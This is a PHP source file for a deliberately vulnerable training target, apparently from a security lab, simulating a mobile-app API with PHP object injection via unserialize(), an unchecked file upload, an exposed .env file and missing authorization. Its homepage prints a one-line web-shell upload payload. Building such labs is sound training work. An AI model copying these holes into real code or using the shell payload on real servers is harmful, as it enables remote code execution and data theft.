<?php
/**
 * LAB TARGET #2 - กลุ่มที่ 2: ระบบหลังบ้านแอปมือถือและ API (PHP Framework)
 * Simulated product: "FieldOps API" (Laravel 8.83-compatible gateway) on PHP 7.4.33
 * Weakness: missing input validation at API edge + unserialize() of client data
 *           (PHP object injection) -> arbitrary file write -> code execution.
 * LISTEN: 8082
 */
require __DIR__ . '/../../common/lab.php';

header('X-Powered-By: PHP/7.4.33');
header('Server: nginx/1.18.0');
ini_set('display_errors', '1');
error_reporting(E_ALL);

const APP_NAME = 'FieldOps API';
const APP_VER  = 'v1.14.2';
$PORT = 8082;
$storage = __DIR__ . '/storage/app/public';
@mkdir($storage, 0777, true);

/** ใช้ใน unserialize() โดยไม่มี allowed_classes — object injection ได้จริง */
class ReportCache
{
    public $path;
    public $data;
    public function __destruct()
    {
        if ($this->path && $this->data !== null) {
            @file_put_contents($this->path, $this->data);
        }
    }
}

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/';
$path = rawurldecode($path);

if ($path === '/health') {
    lab_health([
        'system' => 'mobile-api',
        'group'  => 2,
        'group_name' => 'ระบบหลังบ้านแอปมือถือและ API (Framework)',
        'port'   => $PORT,
        'product'=> APP_NAME . ' ' . APP_VER,
        'php'    => '7.4.33',
        'vuln'   => 'unserialize-object-injection / unvalidated-upload',
    ]);
}

/* -------------------------- stored attachments ---------------------- */
if (preg_match('#^/storage/(.+)$#', $path, $m)) {
    lab_serve_stored($storage, $m[1]);
}

/* ------------------------- .env disclosure (info) ------------------- */
if ($path === '/.env' || $path === '/app/.env') {
    header('Content-Type: text/plain; charset=utf-8');
    echo "APP_NAME=FieldOps\nAPP_ENV=production\nAPP_KEY=base64:ZmllbGRvcHMtbGFiLWtleS1ub3QtcmVhbA==\n";
    echo "APP_DEBUG=true\nDB_CONNECTION=mysql\nDB_HOST=10.20.4.11\nDB_DATABASE=fieldops_prod\n";
    echo "DB_USERNAME=fieldops\nDB_PASSWORD=Fld0ps_Lab_P@ss\nREDIS_HOST=10.20.4.12\n";
    echo "JWT_SECRET=eyJhbGciOiJIUzI1NiJ9.fieldops.lab.secret\n";
    exit;
}

/* --------------------- API: import (object injection) ---------------
 * POST /api/v1/import  payload=<base64(serialized)>
 * โค้ดเดิมใช้ unserialize() กับข้อมูลที่รับจาก API โดยตรง
 * ------------------------------------------------------------------ */
if ($path === '/api/v1/import') {
    if ($_SERVER['REQUEST_METHOD'] !== 'POST') lab_json(['error' => 'method not allowed'], 405);
    $raw = $_POST['payload'] ?? file_get_contents('php://input');
    $decoded = base64_decode((string)$raw, true);
    if ($decoded === false) lab_json(['error' => 'payload must be base64 encoded serialized data'], 400);
    $obj = @unserialize($decoded);            // <-- no allowed_classes restriction
    lab_json([
        'imported' => true,
        'class'    => is_object($obj) ? get_class($obj) : gettype($obj),
        'echo'     => is_object($obj) ? get_object_vars($obj) : null,
        'note'     => 'deserialized without allowed_classes whitelist',
    ]);
}

/* ------------------------ API: avatar upload (VULN) ------------------
 * PUT /api/v1/profile/avatar  body = raw file, header X-Filename
 * ไม่ตรวจสอบนามสกุลไฟล์ก่อนบันทึกใน public storage
 * ------------------------------------------------------------------ */
if ($path === '/api/v1/profile/avatar') {
    if (!in_array($_SERVER['REQUEST_METHOD'], ['PUT', 'POST'], true)) lab_json(['error' => 'method not allowed'], 405);
    $name = $_SERVER['HTTP_X_FILENAME'] ?? 'avatar_' . time() . '.jpg';
    $name = basename($name);
    $body = file_get_contents('php://input');
    if ($body === '' || $body === false) lab_json(['error' => 'empty body'], 400);
    file_put_contents($storage . '/' . $name, $body);
    @chmod($storage . '/' . $name, 0666);
    lab_json([
        'stored' => $name,
        'bytes'  => strlen($body),
        'url'    => 'http://' . ($_SERVER['HTTP_HOST'] ?? 'localhost:' . $PORT) . '/storage/' . $name,
        'note'   => 'filename taken from X-Filename header, extension not validated',
    ]);
}

/* ------------------------------ API basics -------------------------- */
if ($path === '/api/v1/status') {
    lab_json([
        'service' => APP_NAME, 'version' => APP_VER,
        'framework' => 'Laravel 8.83.27 (compat layer)',
        'php' => PHP_VERSION, 'env' => 'production',
        'features' => ['report-import' => 'beta', 'avatar-upload' => 'stable'],
    ]);
}

if ($path === '/api/v1/users') {
    // broken object level authorization
    lab_json([
        'users' => [
            ['id' => 1, 'email' => 'ops.admin@example.internal', 'role' => 'admin', 'phone' => '+66-81-000-0001'],
            ['id' => 2, 'email' => 'field.lead@example.internal', 'role' => 'manager', 'phone' => '+66-81-000-0002'],
            ['id' => 3, 'email' => 'contractor@example.internal', 'role' => 'user', 'phone' => '+66-81-000-0003'],
        ],
        'note' => 'no authorization check on list endpoint',
    ]);
}

/* ------------------------------- homepage --------------------------- */
$files = lab_list_recent($storage);
$rows = '';
foreach ($files as $f) {
    $rows .= '<tr><td class="mono">' . h($f['name']) . '</td><td>' . number_format($f['size']) . ' B</td><td>' . h($f['modified'])
           . '</td><td><a href="/storage/' . h(rawurlencode($f['name'])) . '">open</a></td></tr>';
}
if ($rows === '') $rows = '<tr><td colspan="4" style="color:#94a3b8">ยังไม่มีไฟล์ใน storage</td></tr>';

lab_page(
    'FieldOps API ' . APP_VER,
    'ระบบหลังบ้านของแอปมือถือภาคสนาม: API gateway สำหรับ import รายงาน, avatar, และข้อมูลผู้ใช้',
    'TARGET #2 · กลุ่ม Framework/API · PORT 8082 · PHP 7.4.33',
    'indigo',
    '<div class="card"><h2>Endpoints</h2><table><tbody>
       <tr><td class="mono">GET /api/v1/status</td><td>สถานะระบบและเวอร์ชันเฟรมเวิร์ก</td></tr>
       <tr><td class="mono">GET /api/v1/users</td><td>รายชื่อผู้ใช้ (ไม่มี authz check)</td></tr>
       <tr><td class="mono">POST /api/v1/import</td><td>นำเข้ารายงาน: <code>payload=base64(serialized)</code></td></tr>
       <tr><td class="mono">PUT /api/v1/profile/avatar</td><td>อัปโหลดไฟล์ดิบ ตั้งชื่อผ่าน header <code>X-Filename</code></td></tr>
       <tr><td class="mono">GET /storage/&lt;file&gt;</td><td>public storage (รัน PHP ได้)</td></tr>
       <tr><td class="mono">GET /.env</td><td>ไฟล์ตั้งค่าที่ถูกเสิร์ฟจาก webroot</td></tr>
     </tbody></table></div>
     <div class="card"><h2>Import a report</h2>
       <form action="/api/v1/import" method="post">
         <p><textarea name="payload" rows="3" placeholder="base64(serialize(...))"></textarea></p>
         <button>POST /api/v1/import</button>
       </form>
       <pre>POST /api/v1/import
payload=&lt;base64 of serialized PHP object&gt;

PUT /api/v1/profile/avatar
X-Filename: shell.php
&lt;?php system($_GET[c]); ?&gt;</pre>
     </div>
     <div class="card"><h2>Public storage</h2>
       <table><thead><tr><th>File</th><th>Size</th><th>Modified</th><th></th></tr></thead><tbody>' . $rows . '</tbody></table></div>'
);
